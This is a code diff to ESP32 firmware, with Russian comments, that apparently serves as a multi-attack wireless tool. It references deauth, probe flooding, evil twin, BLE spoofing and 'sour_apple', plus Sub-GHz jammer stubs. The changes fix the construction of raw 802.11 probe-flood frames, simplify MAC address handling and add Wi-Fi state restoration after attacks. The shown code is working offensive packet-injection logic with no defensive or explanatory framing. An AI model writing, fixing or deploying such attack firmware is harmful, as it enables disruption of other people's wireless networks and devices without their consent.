@@ -18,11 +18,7 @@ String currentAttack = "";
 
 // ===== ВСПОМОГАТЕЛЬНАЯ ФУНКЦИЯ (получение MAC) =====
 void getMacAddress(uint8_t *mac) {
-  String macStr = WiFi.macAddress();
-  char macBuf[18];
-  macStr.toCharArray(macBuf, sizeof(macBuf));
-  sscanf(macBuf, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
-         &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
+  WiFi.macAddress(mac);
 }
 
 // ===== ОТПРАВКА DEAUTH (широковещательно) =====
@@ -58,7 +54,8 @@ void sendProbeFlood() {
   uint8_t mac[6];
   getMacAddress(mac);
   char ssid[] = "ProbeTest";
-  uint8_t probe_packet[24 + strlen(ssid) + 1] = {
+  const int ssid_len = sizeof(ssid) - 1;
+  uint8_t probe_packet[24 + 2 + ssid_len] = {
     0x40, 0x00,
     0x00, 0x00,
     0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
@@ -67,9 +64,9 @@ void sendProbeFlood() {
   memcpy(&probe_packet[16], mac, 6);
   int pos = 24;
   probe_packet[pos++] = 0x00;
-  probe_packet[pos++] = strlen(ssid);
-  memcpy(&probe_packet[pos], ssid, strlen(ssid));
-  pos += strlen(ssid);
+  probe_packet[pos++] = ssid_len;
+  memcpy(&probe_packet[pos], ssid, ssid_len);
+  pos += ssid_len;
   for (int i = 0; i < 50; i++) {
     if (!attackRunning) break;
     esp_wifi_80211_tx(WIFI_IF_STA, probe_packet, pos, false);
@@ -222,6 +219,15 @@ void startSubGhzReplay() { Serial.println("⚠️ Sub-GHz Replay требует 
 void startSubGhzJammer() { Serial.println("⚠️ Sub-GHz Jammer требует CC1101"); }
 void startIRReplay() { Serial.println("⚠️ IR Replay требует IR-диод"); }
 
+// ===== ВОССТАНОВЛЕНИЕ СОСТОЯНИЯ WI-FI =====
+void restoreWiFiState() {
+  WiFi.mode(WIFI_AP_STA);
+  WiFi.disconnect();
+  esp_wifi_set_promiscuous(true);
+  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
+  esp_wifi_set_promiscuous(false);
+}
+
 // ===== ОСТАНОВКА АТАК =====
 void stopAttack() {
   attackRunning = false;
@@ -232,6 +238,7 @@ void stopAttack() {
   }
   BLEDevice::deinit();
   esp_wifi_set_promiscuous(false);
+  restoreWiFiState();
   Serial.println("⏹️ Все атаки остановлены");
 }
 
@@ -340,6 +347,7 @@ void loop() {
     if (currentAttack == attack && attack != "evil_twin" && attack != "ble_spoofer" && attack != "sour_apple") {
       attackRunning = false;
       currentAttack = "";
+      restoreWiFiState();
     }
   }
   delay(10);
